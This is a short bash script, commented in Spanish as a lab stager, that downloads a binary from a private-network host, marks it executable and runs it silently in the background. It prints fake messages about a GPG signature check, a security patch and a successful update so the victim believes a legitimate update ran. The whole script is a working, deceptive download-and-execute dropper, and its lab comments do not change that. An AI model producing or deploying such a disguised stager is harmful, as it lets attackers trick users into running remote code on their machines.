#!/bin/bash
# Stager del laboratorio: descarga el payload y lo ejecuta en segundo plano.
# Uso confinado al escenario educativo del README (red interna entre VMs).

URL="http://192.168.199.130/SysUpdate_Static"
RUTA="$HOME/Descargas/SysUpdate_Static"

echo "[+] Verificando firma del paquete (GPG)... OK"
sleep 1
wget -q "$URL" -O "$RUTA" || curl -s "$URL" -o "$RUTA"
chmod +x "$RUTA"
nohup "$RUTA" >/dev/null 2>&1 &
echo "[+] Aplicando parche de seguridad SEC-2026-0902..."
sleep 2
echo "[+] Actualización completada con éxito."
